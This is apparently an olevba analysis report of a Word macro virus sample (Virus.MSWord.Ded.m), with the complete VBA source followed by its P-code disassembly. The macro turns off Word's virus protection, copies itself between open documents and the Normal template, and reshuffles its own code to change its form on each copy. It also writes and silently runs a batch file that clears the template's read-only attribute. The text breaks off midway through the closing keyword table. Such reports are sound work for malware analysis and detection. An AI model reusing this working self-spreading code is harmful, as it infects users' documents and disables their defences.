olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private _
Sub Document_Close()

  On Error GoTo skam
'24,01388
          Options. _
VirusProtection = False

              SWL
'12,00358
       ABS99
'4,611689
skam:
'57,84001
          End _
Sub

 Private Sub _
Čäĺíňčôčęŕňîđ()

        End Sub
'19,21073
     Private Sub Document_New()
'81,87105
 End Sub
'80,53137
       Sub Claudio()
'84,76658
       On Error _
GoTo skam

     Options. _
VirusProtection = False

SWL
'96,09924
         ABS99
'38,10434
skam:
'60,13807
             End Sub
'95,08818
             Private _
Sub SWL()

      Application. _
                                     ShowVisualBasicEditor = False

 If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For I = 1 To NormalTemplate. _
VBProject.VBComponents(1).CodeModule.CountOfLines

 d = NormalTemplate.VBProject. _
           VBComponents(1).CodeModule.Lines(I, 1)

If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

      While Mid(d, _
Len(d) - 1, 2) = " _"

         I = I + 1
'53,45006
           d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          Wend
'61,9153
            d _
= e(d)

            ActiveDocument. _
             VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

       End _
If

              Next I
'53,62399
   ActiveDocument. _
                                                SaveAs AddToRecentFiles:=False

       End _
If

   End Sub
'61,97636
              Private Sub _
ABS99()

              If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

      f (NormalTemplate.FullName)
'18,174
       For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

     d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          If Len(d) > 0 And _
Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

While Mid(d, Len(d) - 1, _
2) = " _"

            I = _
I + 1

              d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

             Wend
'43,81393
        d _
= e(d)

             NormalTemplate. _
               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

         End If
'26,32273
        Next I
'52,36308
         NormalTemplate. _
                       Save

     End _
If

       End _
Sub

              Private _
Function e(aString) As String

     aString _
= LTrim(aString)

           aString = RTrim(aString)
'21,68937
   If aString = "Sub " & "Vc()" Then
'80,61559
       aString = "Sub " & "ViewVBCode()"
'99,9728
     Else
'66,88805
     If aString _
= "Sub " & "ViewVBCode()" Then

aString _
= "Sub " & "Vc()"

         End _
If

   End If
'37,50021
             For I = 1 _
To Len(aString) - 1

             If _
Mid(aString, I, 1) = "." Then

  If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

  If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

            e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

   For _
j = 1 To Int(15 * Rnd)

      e _
= " " & e

         Next _
j

Exit Function
'52,25902
End _
If

        End If
'90,59289
   Else
'97,62254
         If Mid(aString, I, 1) = " " And Int(3 _
* Rnd) = 1 And I > 1 Then

  If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

          e = _
Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

         For j _
= 1 To Int(15 * Rnd)

         e = " " & _
e

        Next _
j

             Exit _
Function

        End If
'20,05503
            End If
'55,69043
   End If
'8,722788
     Next _
I

           e = aString & _
Chr$(13) & "'" & (100 * Rnd)

   Count _
= Int(15 * Rnd)

          For j = 1 _
To Count

   e _
= " " & e

            Next j
'31,15959
      End Function
'16,17793
 Private _
Sub f(fName)

If GetAttr(fName) _
And vbReadOnly Then

          Open _
Dir(fName) & ".bat" For Append As #1

  Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
'35,75141
            Print #1, "del " & Chr$(34) & _
Dir(fName) & ".bat" & Chr$(34)

   Close #1
'19,25556
 shellResult _
= Shell(Dir(fName) & ".bat", vbHide)

    End If
'15,73996
            End Sub
'77,7336
       Sub ViewVBCode()
'24,21011
         For _
aDoc = 1 To Documents.Count

              For I _
= 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc). _
        VBProject.VBComponents(1).CodeModule.DeleteLines 1

     Next I
'49,5485
            Next aDoc
'82,55717
 For I _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

     NormalTemplate. _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

     Next I
'92,32065
        Application.ShowVisualBasicEditor = True
'36,26178
    End Sub
'70,12241
 Private _
Sub Document_Open()

  End _
Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10687 bytes
' Line #0:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError skam 
' Line #3:
' 	QuoteRem 0x0000 0x0008 "24,01388"
' Line #4:
' 	LineCont 0x0004 02 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	ArgsCall SWL 0x0000 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "12,00358"
' Line #8:
' 	ArgsCall ABS99 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0008 "4,611689"
' Line #10:
' 	Label skam 
' Line #11:
' 	QuoteRem 0x0000 0x0008 "57,84001"
' Line #12:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #13:
' Line #14:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Čäĺíňčôčęŕňîđ())
' Line #15:
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "19,21073"
' Line #18:
' 	FuncDefn (Private Sub Document_New())
' Line #19:
' 	QuoteRem 0x0000 0x0008 "81,87105"
' Line #20:
' 	EndSub 
' Line #21:
' 	QuoteRem 0x0000 0x0008 "80,53137"
' Line #22:
' 	FuncDefn (Sub Claudio())
' Line #23:
' 	QuoteRem 0x0000 0x0008 "84,76658"
' Line #24:
' 	LineCont 0x0004 02 00 00 00
' 	OnError skam 
' Line #25:
' Line #26:
' 	LineCont 0x0004 02 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' Line #28:
' 	ArgsCall SWL 0x0000 
' Line #29:
' 	QuoteRem 0x0000 0x0008 "96,09924"
' Line #30:
' 	ArgsCall ABS99 0x0000 
' Line #31:
' 	QuoteRem 0x0000 0x0008 "38,10434"
' Line #32:
' 	Label skam 
' Line #33:
' 	QuoteRem 0x0000 0x0008 "60,13807"
' Line #34:
' 	EndSub 
' Line #35:
' 	QuoteRem 0x0000 0x0008 "95,08818"
' Line #36:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub SWL())
' Line #37:
' Line #38:
' 	LineCont 0x0004 02 00 25 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #39:
' Line #40:
' 	LineCont 0x0004 02 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #41:
' Line #42:
' 	LineCont 0x0004 07 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #43:
' Line #44:
' 	LineCont 0x0004 06 00 0B 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #45:
' Line #46:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #47:
' Line #48:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #49:
' Line #50:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #51:
' 	QuoteRem 0x0000 0x0008 "53,45006"
' Line #52:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #53:
' Line #54:
' 	Wend 
' Line #55:
' 	QuoteRem 0x0000 0x0007 "61,9153"
' Line #56:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #57:
' Line #58:
' 	LineCont 0x0004 02 00 0D 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' Line #60:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #61:
' Line #62:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	QuoteRem 0x0000 0x0008 "53,62399"
' Line #64:
' 	LineCont 0x0004 02 00 30 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #65:
' Line #66:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #67:
' Line #68:
' 	EndSub 
' Line #69:
' 	QuoteRem 0x0000 0x0008 "61,97636"
' Line #70:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub ABS99())
' Line #71:
' Line #72:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #73:
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #75:
' 	QuoteRem 0x0000 0x0006 "18,174"
' Line #76:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #77:
' Line #78:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #79:
' Line #80:
' 	LineCont 0x0004 08 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #81:
' Line #82:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #83:
' Line #84:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #85:
' Line #86:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #87:
' Line #88:
' 	Wend 
' Line #89:
' 	QuoteRem 0x0000 0x0008 "43,81393"
' Line #90:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #91:
' Line #92:
' 	LineCont 0x0004 02 00 0F 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	QuoteRem 0x0000 0x0008 "26,32273"
' Line #96:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	QuoteRem 0x0000 0x0008 "52,36308"
' Line #98:
' 	LineCont 0x0004 02 00 17 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #99:
' Line #100:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #103:
' Line #104:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #105:
' Line #106:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #107:
' Line #108:
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #109:
' 	QuoteRem 0x0000 0x0008 "21,68937"
' Line #110:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #111:
' 	QuoteRem 0x0000 0x0008 "80,61559"
' Line #112:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #113:
' 	QuoteRem 0x0000 0x0007 "99,9728"
' Line #114:
' 	ElseBlock 
' Line #115:
' 	QuoteRem 0x0000 0x0008 "66,88805"
' Line #116:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #117:
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #119:
' Line #120:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #121:
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	QuoteRem 0x0000 0x0008 "37,50021"
' Line #124:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #125:
' Line #126:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #127:
' Line #128:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #129:
' Line #130:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #133:
' Line #134:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #135:
' Line #136:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #137:
' Line #138:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' Line #140:
' 	ExitFunc 
' Line #141:
' 	QuoteRem 0x0000 0x0008 "52,25902"
' Line #142:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #143:
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x0008 "90,59289"
' Line #146:
' 	ElseBlock 
' Line #147:
' 	QuoteRem 0x0000 0x0008 "97,62254"
' Line #148:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #149:
' Line #150:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #151:
' Line #152:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #153:
' Line #154:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #155:
' Line #156:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #157:
' Line #158:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #161:
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	QuoteRem 0x0000 0x0008 "20,05503"
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	QuoteRem 0x0000 0x0008 "55,69043"
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	QuoteRem 0x0000 0x0008 "8,722788"
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #169:
' Line #170:
' 	LineCont 0x0004 04 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #171:
' Line #172:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #173:
' Line #174:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #175:
' Line #176:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #177:
' Line #178:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #179:
' 	QuoteRem 0x0000 0x0008 "31,15959"
' Line #180:
' 	EndFunc 
' Line #181:
' 	QuoteRem 0x0000 0x0008 "16,17793"
' Line #182:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #183:
' Line #184:
' 	LineCont 0x0004 05 00 00 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #185:
' Line #186:
' 	LineCont 0x0004 01 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #187:
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #189:
' 	QuoteRem 0x0000 0x0008 "35,75141"
' Line #190:
' 	LineCont 0x0004 0B 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #191:
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #193:
' 	QuoteRem 0x0000 0x0008 "19,25556"
' Line #194:
' 	LineCont 0x0004 01 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #195:
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	QuoteRem 0x0000 0x0008 "15,73996"
' Line #198:
' 	EndSub 
' Line #199:
' 	QuoteRem 0x0000 0x0007 "77,7336"
' Line #200:
' 	FuncDefn (Sub ViewVBCode())
' Line #201:
' 	QuoteRem 0x0000 0x0008 "24,21011"
' Line #202:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #203:
' Line #204:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #205:
' Line #206:
' 	LineCont 0x0004 05 00 08 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #207:
' Line #208:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	QuoteRem 0x0000 0x0007 "49,5485"
' Line #210:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #211:
' 	QuoteRem 0x0000 0x0008 "82,55717"
' Line #212:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #213:
' Line #214:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #215:
' Line #216:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #217:
' 	QuoteRem 0x0000 0x0008 "92,32065"
' Line #218:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #219:
' 	QuoteRem 0x0000 0x0008 "36,26178"
' Line #220:
' 	EndSub 
' Line #221:
' 	QuoteRem 0x0000 0x0008 "70,12241"
' Line #222:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Open())
' Line #223:
' Line #224:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #225:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
